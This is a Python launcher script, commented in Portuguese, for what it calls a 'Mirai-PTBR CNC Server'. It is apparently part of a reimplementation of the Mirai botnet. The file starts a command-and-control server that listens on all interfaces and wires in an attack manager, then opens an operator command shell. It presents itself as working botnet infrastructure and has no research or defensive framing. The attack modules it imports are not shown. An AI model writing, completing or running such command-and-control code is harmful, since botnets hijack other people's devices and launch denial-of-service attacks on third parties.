#!/usr/bin/env python3
"""
Ponto de entrada principal do CNC.
Inicia o servidor e a CLI simultaneamente.

Pode ser executado diretamente: python3 cnc/main.py
Ou via: python3 main.py cnc
"""

import sys
import os

# ═══════════════════════════════════════════════════════════════════════════
# CORREÇÃO DE IMPORTS: Garante que a RAIZ do projeto esteja no sys.path
# Isso permite imports absolutos como "from cnc.protocol import X"
# funcionem independentemente de como o script for executado.
_PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
if _PROJECT_ROOT not in sys.path:
    sys.path.insert(0, _PROJECT_ROOT)

# Também adiciona todos os subdiretórios (para imports flat)
for _root, _dirs, _ in os.walk(_PROJECT_ROOT):
    _dirs[:] = [d for d in _dirs if not d.startswith('.') and d != '__pycache__']
    if _root not in sys.path:
        sys.path.insert(0, _root)
# ═══════════════════════════════════════════════════════════════════════════

import asyncio
import threading

# Imports absolutos do projeto
from cnc.server import MiraiServer
from cnc.client import MiraiCLI
from cnc.attack import AttackManager


class CNCRunner:
    """Executa servidor e CLI em paralelo."""

    def __init__(self, host='0.0.0.0', port=7000):
        self.host = host
        self.port = port
        self.cnc = None
        self.attack_mgr = None

    async def start_server(self):
        self.cnc = MiraiServer(self.host, self.port)
        self.attack_mgr = AttackManager(self.cnc)
        self.cnc.attack_mgr = self.attack_mgr
        await self.cnc.start()

    def start_cli(self):
        shell = MiraiCLI(self.host, self.port)
        # Compartilha a referência do server com a CLI
        # (a CLI inicia o server em thread separada no preloop)
        shell.cmdloop()

    def run(self):
        print("[*] Iniciando CNC...")

        # Server em thread separada
        def run_server():
            asyncio.run(self.start_server())

        server_thread = threading.Thread(target=run_server, daemon=True)
        server_thread.start()

        # Pequena pausa para o servidor iniciar
        import time
        time.sleep(0.5)

        # CLI no thread principal
        self.start_cli()


def main():
    import argparse
    parser = argparse.ArgumentParser(description='Mirai-PTBR CNC Server')
    parser.add_argument('--host', default='0.0.0.0', help='Host para ouvir')
    parser.add_argument('--port', type=int, default=7000, help='Porta para ouvir')

    args = parser.parse_args()

    runner = CNCRunner(args.host, args.port)

    try:
        runner.run()
    except KeyboardInterrupt:
        print("\n[!] CNC encerrado.")
        sys.exit(0)


if __name__ == '__main__':
    main()
